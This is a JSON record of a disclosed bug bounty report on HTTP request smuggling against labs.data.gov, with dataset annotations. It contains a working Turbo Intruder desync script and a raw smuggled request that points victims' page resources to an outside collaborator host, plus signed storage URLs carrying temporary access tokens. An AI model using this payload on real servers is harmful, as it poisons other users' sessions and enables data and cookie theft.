{
    "reported_to": "GSA Bounty",
    "reported_by": "puppykok ",
    "title": "HTTP Request Smuggling on https://labs.data.gov",
    "content": "\nGreetings,\nThe application appears to be vulnerable to HTTP request smuggling due to a disagreement between the front-end and back-end server, where the front-end server uses the Transfer-Encoding header to determine content in the HTTP body, but back-end server uses the Content-Length header, which causes a desync. The following steps outline how to reproduce this vulnerability:\nThe purpose of the following Turbo Intruder script is to send a desync request followed by 14 requests in quick succession to increase the chances of catching the desync-ed request such that it would not poison the request of another user who happens to be browsing the page.\nCode 1.22 KiB\n1import re\n2\n3def queueRequests(target, wordlists):\n4\n5    # to use Burp's HTTP stack for upstream proxy rules etc, use engine=Engine.BURP\n6    engine = RequestEngine(endpoint=target.endpoint,\n7                           concurrentConnections=5,\n8                           requestsPerConnection=1,\n9                           resumeSSL=False,\n10                           timeout=10,\n11                           pipeline=False,\n12                           maxRetriesPerRequest=0,\n13                           engine=Engine.THREADED,\n14                           )\n15    engine.start()\n16\n17    prefix = '''POST /hopefully404 HTTP/1.1\n18Host: o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net\n19Content-Type: application/x-www-form-urlencoded\n20Content-Length: 15\n21\n22x=1'''\n23\n24    chunk_size = hex(len(prefix)).lstrip(\"0x\")\n25    attack = target.req.replace('0\\r\\n\\r\\n', chunk_size+'\\r\\n'+prefix+'\\r\\n0\\r\\n\\r\\n')\n26    content_length = re.search('Content-Length: ([\\d]+)', attack).group(1)\n27    attack = attack.replace('Content-Length: '+content_length, 'Content-length: '+str(int(content_length)+len(chunk_size)-3))\n28    engine.queue(attack)\n29\n30    for i in range(14):\n31        engine.queue(target.req)\n32        time.sleep(0.05)\n33\n34\n35def handleResponse(req, interesting):\n36    table.add(req)\nThe following desync request issued to the server is shown below, where I changed the host header to my Burp's collaborator domain:\nCode 512 Bytes\n1POST / HTTP/1.1\n2Host: labs.data.gov\n3Accept-Encoding: gzip, deflate\n4Accept: */*\n5Accept-Language: en\n6User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\n7Connection: keep-alive\n8Content-Type: application/x-www-form-urlencoded\n9Content-length: 4\n10Transfer-Encoding : chunked\n11\n12a2\n13POST /hopefully404 HTTP/1.1\n14Host: o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net\n15Content-Type: application/x-www-form-urlencoded\n16Content-Length: 15\n17\n18x=1\n190\n<image_0>\nThe following request is heavily shortened to show that the attacker's host URL is reflected in multiple critical areas within the victim's response:\nCode 2.96 KiB\n1-snip\n2<script type='application/ld+json' class='yoast-schema-graph yoast-schema-graph--main'>{\"@context\":\"https://schema.org\",\"@graph\":[{\"@type\":\"WebSite\",\"@id\":\"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/#website\",\"url\":\"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/\",\"name\":\"Data.gov\",\"potentialAction\":{\"@type\":\"SearchAction\",\"target\":\"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/?s={search_term_string}\",\"query-input\":\"required name=search_term_string\"}}]}</script>\n3<!-- / Yoast SEO plugin. -->\n4\n5-snip-\n6\n7<link rel=\"stylesheet\" href=\"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/app/plugins/simple-tooltips/zebra_tooltips.css?ver=5.2.4\">\n8<link rel=\"stylesheet\" href=\"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/app/plugins/the-events-calendar/common/src/resources/css/reset.min.css?ver=4.9.16\">\n9<link rel=\"stylesheet\" href=\"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/app/plugins/the-events-calendar/common/src/resources/css/common.min.css?ver=4.9.16\">\n10<link rel=\"stylesheet\" href=\"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/app/plugins/the-events-calendar/common/src/resources/css/tooltip.min.css?ver=4.9.16\">\n11<link rel=\"stylesheet\" href=\"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/wp/wp-includes/css/dist/block-library/style.min.css?ver=5.2.4\">\n12\n13-snip-\n14\n15<a class=\"dropdown-toggle local-link\" data-toggle=\"dropdown\" data-target=\"#\" href=\"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/communities/\">Topics <b class=\"caret\"></b></a>\n16<ul class=\"dropdown-menu topics\">\n17\t<li class=\"menu-agriculture topic-food\"><a href=\"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/food/\" class=\"local-link\"><i></i><span>Agriculture</span></a></li>\n18\t<li class=\"menu-climate topic-climate\"><a href=\"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/climate/\" class=\"local-link\"><i></i><span>Climate</span></a></li>\n19\t<li class=\"menu-consumer topic-consumer\"><a href=\"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/consumer/\" class=\"local-link\"><i></i><span>Consumer</span></a></li>\n20\t<li class=\"menu-ecosystems topic-ecosystems\"><a href=\"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/ecosystems/\" class=\"local-link\"><i></i><span>Ecosystems</span></a></li>\n21\t<li class=\"menu-education topic-education\"><a href=\"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/education/\" class=\"local-link\"><i></i><span>Education</span></a></li>\n22\t<li class=\"menu-energy topic-energy\"><a href=\"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/energy/\" class=\"local-link\"><i></i><span>Energy</span></a></li>\n23\t<li class=\"menu-finance topic-finance\"><a href=\"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/finance/\" class=\"local-link\"><i></i><span>Finance</span></a></li>\n24\t<li class=\"menu-health topic-health\"><a href=\"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/health/\" class=\"local-link\"><i></i><span>Health</span></a></li>\n<image_1>\nImpact\nSince the javascript imports on the page can be determined by the attacker, he can host a malicious domain to steal user data, perform stored cross-site scripting and defacing the webpage for the user whos request was poisoned by the desynced request. In addition, I noticed there was a Wordpress login page but seems like it requires a specially-configured browser to access the SSO. My suspicion is that it is very likely that an attacker can steal authenticated cookies/headers which will be sent to an attacker-controlled server, although I am unable to verify (Can't get SSO to work on my browser).\n\n",
    "severity": [
        7.7,
        null
    ],
    "bounty": 750,
    "weaknesses": [
        "HTTP Request Smuggling"
    ],
    "screenshots": {
        "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/iJodnWM1HXwufBPQvPq5yMUv?response-content-disposition=attachment%3B%20filename%3D%22turbo1.png%22%3B%20filename%2A%3DUTF-8%27%27turbo1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZOV47FIN%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T004926Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCgYKWDKCX9IkJ%2Fn%2F%2FR%2BUGjbHCmZaMH6hXJVxORmsuhSQIhAO99hWiP2CeVp8L5RCXc8YnApZJjS3A60bVJjaDGhHgoKrIFCB8QAxoMMDEzNjE5Mjc0ODQ5IgwOEJOClSL%2BzacuBiMqjwWdKdMgeHdJxBO3DgkzddWGAByaiIqk53B4wcVd10nR9PckZaCyq7%2Fu%2BLrHSwQJJE%2FO48%2BI88fNzPkuK9xU4B1R%2FPFNb%2BpAt3Lj7yq%2BDoY1ZLR1NY3M8K3pX5Yt6ukCfTzjFSXhpyUjnRVTYyIhQYpM4APpJppiCTw0UqGQ1qhNtms6fnf7rxpafApAgqdyAIXj5B5khIE3fizEs85uW8lGNNViX3U3%2Fe6UI3X8nmdI8crbcWPjDyRieyd1brYNYqPTEv2lSTcfE5XhH8bdrO5ac4CtGXwK8GxU7Dt8Zj35Vt5HmKERkuogBRG2uyMwC2rsIRcy2u1MwdCLFZYHJNqsvaJ%2BLKKIfdJBw6Jv%2BAimu7bjEBt%2FBv12fRBlOJt5k3Nm5z8LDpw%2BQ%2FUq%2FLBQsVdw5Q5mzdoyt2RU4JcRB%2FfHeN36tseonWsYu1TfQWB0HsFk326uwb644KKLhFhfr8HwvOzxjsGaMuIm8r949sj3S7xBCU5HknY9LpfeDRcdsDVKjY8ZlVXjFa8jbSmPeB4FyBZ%2FKpcKG8CIWNtJ0AI7RZpopH1K%2FHTjL7Of%2F5G5obqXTC05ROxYOvyCDS4Elu7DFqWeNDrZA8XAHXGDTAVe8K11wyudFP%2FI2d8LsqI8rpT9B8LiAq9JTMiB1MGWuD1YWyPYcOBAXi%2Fp2LpXROn0DBYLJlHCFnDfSedU8qsXIaaWUDKtC3Y1S8lwcW%2FsZIrc%2FLX%2BitrCLOMnRLHRCRGSqDyUlAe2tvM%2FnMyqn%2Bu%2FY3Ui0sTVg3Gh0zXIDR%2BWiig2eRzhq72DQ8MXr7u%2FzO%2BM%2FJe8AOho80bMKY65xz5a6dNP57Bdu7dawqfWWKTYq4y8eM1YHsrEx9xenoUvI9QuMM%2FOjL8GOrABX2h%2FXSlr%2BqQLpFjNCFtKMSNynaVmq8CGxSbUpCeJKL9bYdtJgUdSQmTGbSqv1fmsT8w8UoYd7zHTBM5r%2FT1IxAYgKCs7%2F%2B1TzfL1TShrhd7jYUQ2dcvkYfBpfi%2BhTwLzXShc5NVxnXxHTzIMcPeHDFjl3sENY7WHUvSBYECLpn1Z30fPqCkoH%2FOFRLgkzbhuBdJgKReEaykiG2d0BKlj%2FVzPF29t4AFL6thAkxmVYGU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=45c54f1b5ab72ae91e78e40a9e9876aa0868bd768d2354266dc00e6256c51b5d",
        "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/LayXASEX5Qc7U8g4rsYArLP9?response-content-disposition=attachment%3B%20filename%3D%22turbo2.png%22%3B%20filename%2A%3DUTF-8%27%27turbo2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZOV47FIN%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T004926Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCgYKWDKCX9IkJ%2Fn%2F%2FR%2BUGjbHCmZaMH6hXJVxORmsuhSQIhAO99hWiP2CeVp8L5RCXc8YnApZJjS3A60bVJjaDGhHgoKrIFCB8QAxoMMDEzNjE5Mjc0ODQ5IgwOEJOClSL%2BzacuBiMqjwWdKdMgeHdJxBO3DgkzddWGAByaiIqk53B4wcVd10nR9PckZaCyq7%2Fu%2BLrHSwQJJE%2FO48%2BI88fNzPkuK9xU4B1R%2FPFNb%2BpAt3Lj7yq%2BDoY1ZLR1NY3M8K3pX5Yt6ukCfTzjFSXhpyUjnRVTYyIhQYpM4APpJppiCTw0UqGQ1qhNtms6fnf7rxpafApAgqdyAIXj5B5khIE3fizEs85uW8lGNNViX3U3%2Fe6UI3X8nmdI8crbcWPjDyRieyd1brYNYqPTEv2lSTcfE5XhH8bdrO5ac4CtGXwK8GxU7Dt8Zj35Vt5HmKERkuogBRG2uyMwC2rsIRcy2u1MwdCLFZYHJNqsvaJ%2BLKKIfdJBw6Jv%2BAimu7bjEBt%2FBv12fRBlOJt5k3Nm5z8LDpw%2BQ%2FUq%2FLBQsVdw5Q5mzdoyt2RU4JcRB%2FfHeN36tseonWsYu1TfQWB0HsFk326uwb644KKLhFhfr8HwvOzxjsGaMuIm8r949sj3S7xBCU5HknY9LpfeDRcdsDVKjY8ZlVXjFa8jbSmPeB4FyBZ%2FKpcKG8CIWNtJ0AI7RZpopH1K%2FHTjL7Of%2F5G5obqXTC05ROxYOvyCDS4Elu7DFqWeNDrZA8XAHXGDTAVe8K11wyudFP%2FI2d8LsqI8rpT9B8LiAq9JTMiB1MGWuD1YWyPYcOBAXi%2Fp2LpXROn0DBYLJlHCFnDfSedU8qsXIaaWUDKtC3Y1S8lwcW%2FsZIrc%2FLX%2BitrCLOMnRLHRCRGSqDyUlAe2tvM%2FnMyqn%2Bu%2FY3Ui0sTVg3Gh0zXIDR%2BWiig2eRzhq72DQ8MXr7u%2FzO%2BM%2FJe8AOho80bMKY65xz5a6dNP57Bdu7dawqfWWKTYq4y8eM1YHsrEx9xenoUvI9QuMM%2FOjL8GOrABX2h%2FXSlr%2BqQLpFjNCFtKMSNynaVmq8CGxSbUpCeJKL9bYdtJgUdSQmTGbSqv1fmsT8w8UoYd7zHTBM5r%2FT1IxAYgKCs7%2F%2B1TzfL1TShrhd7jYUQ2dcvkYfBpfi%2BhTwLzXShc5NVxnXxHTzIMcPeHDFjl3sENY7WHUvSBYECLpn1Z30fPqCkoH%2FOFRLgkzbhuBdJgKReEaykiG2d0BKlj%2FVzPF29t4AFL6thAkxmVYGU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d42b93f59679202780e8c8e75491272d74a7fe68e6edd589ccb1c6f86a27d898"
    },
    "disclosed_date": 1589401680,
    "report_url": "https://hackerone.com/reports/726773",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "HIGH",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Craft a desync request with conflicting Transfer-Encoding and Content-Length headers, targeting the front-end and back-end servers"
        ],
        [
            2,
            "Send the crafted request followed by 14 quick successive requests to increase the chance of poisoning another user's request"
        ]
    ],
    "vuln_description": "The application is vulnerable to HTTP request smuggling due to a disagreement between the front-end and back-end servers on how to handle the HTTP body. The front-end uses the Transfer-Encoding header while the back-end uses the Content-Length header, causing a desync that can poison other users' requests.",
    "reason": "This vulnerability requires understanding of HTTP request smuggling techniques, crafting a specific request with conflicting headers, and timing the attack to poison other users' sessions. The attack involves multiple components (headers, request timing, server behavior) and subtle interactions between them.",
    "new_complexity": "HIGH",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}